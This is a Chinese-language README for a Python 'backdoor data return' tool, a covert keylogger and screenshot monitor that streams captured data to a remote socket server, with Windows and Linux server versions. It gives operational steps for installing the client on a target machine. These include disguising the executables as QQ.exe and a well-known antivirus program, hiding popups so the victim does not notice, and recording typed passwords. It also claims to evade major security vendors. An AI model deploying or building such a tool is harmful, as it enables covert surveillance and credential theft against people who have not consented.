    
# 新版本2.0更新：1.增加了新项目，linux服务端。用法与windows相同，python3直接运行即可。
#              2.修复大部分BUG如微小弹窗，会被察觉已经修复。
#              3.优化缩小了win客户端和win服务端已经linux端的容量，从30MB降到了5MB大大提高了速度
------------------------------------------------------------------------
#QQ： 2472674814
#Ahthor：握着玫瑰的屠夫
#date: 2020.11.27
#开发语言python3.78
#后门数据回传程序，分四大大部分。
# -----------------成品都在output文件夹里----------------------
# -----------------源码则在sourcode----------------------------
# 1.windows监控，2.windows客户端 3.windows服务端 4.linux服务端
#使用方法：
#1.开启服务端输入公网服务端器IP，如果是测试局域网也行
#会在当前目录产生一个名为 Monitor_config.txt的配置文件，
#在目标建立同样名和内容文件，或复制过去。
# 2.把Monitor_config.txt服务端配置文件，放在客户端文件内。
#是成品话我已经把监控软件放在socket客户端内，所以直接运行。下面
# 3.进入客户端无弹窗>>进入Msocket>>>用管理权限运行火绒.exe或命令行.
# 4.返回客户端无弹窗运行QQ.exe
#以上就是所有成品的操作流程。如果你在输入密码或者别的时候则会记录起来。
#这时你的服务端则会有自动接收下载到服务端。
#截屏>>>服务端弹窗>>>MKB>>>images目录下
#键盘记录>>>服务端弹窗>>>Monitor_log.txt

#关于源码操作稍微复杂点，感兴趣可以往下看。
#如果想看图文教程，则上我的博客：https://www.cnblogs.com/eternalnight/
# 1.先用python3 运行SocketWinServer.py 
#输入服务端号，就是你本机IP，或域名。
#生成一个名为Monitor_config.txt配置文件，接下来就等待客户端回传
# 2.python3 在目标机子运行 SocketWinClient.py
#弹窗版会提示输入服务端IP和端口号，输入如上一致。
#则会在当前目录生成一个名为Msocket的目录将监控程序放进去。
#原理很简单，Socket客户端会监控在Msocket目录下的QQdata\xx11和QQdata\Monitor_log.txt
#的文件，而监控软件则是将监控的内容记录在上面两个地方。一个是生成一个是搬运。
# 3.将MonitorNoWin.py监控放在客户端目录下的 Msocket目录下运行即可
#导入的库1.pythoncom, 2.PyHook3, 3.os, 4.time 5.threading 6.win32api 7.PIL
#监控的库3/1都需要外安装，其中PyHook3无法pip直接安装。
1.PyHook3库我已经上传我的github,安装方式如下
#git clone https://github.com/EternalNight996/PyHook3.git
#cd PyHook3
#pip install PyHook3-1.6.1-cp37-cp37m-win_amd64.whl
#库的演示打开example.py即可
# 2.PIL库安装  pip install pillow
# 3.win32api安装 pip install pywin32
安装完库了，则直接python3 MonitorNoWin.py，则开始监控键盘和鼠标。
监控的内容则放到QQdata/xx11 和 QQdata/Monitor_log.txt

其功能：1.监控部分关键词窗口并记录  2.远程实时传输截屏和键盘记录 3.全自动化无需额外操作
        4.无视各大安全厂商封杀
后话：做这个软件其问题关键应该是在socket传输上，修修改改无数次。
    后面版本正在更新>>>>LINUX版的服务端，为什么要做linux服务端？
    其实我的初衷呢！是因为在做渗透测试，发现meterpreter的内置键盘监听和截屏
    其功能过于单调和不人性化，我想着能不能做个全自动实时监听来？
    就这么搞起来了，欢迎交流沟通！！！

如果有像了解更多软件技术细节可以留意我博客会公布在哪。
https://www.cnblogs.com/eternalnight/
由于这是初版，也添加了不少限制。还需要后期调整和增加功能，有什么建议可以私聊我。

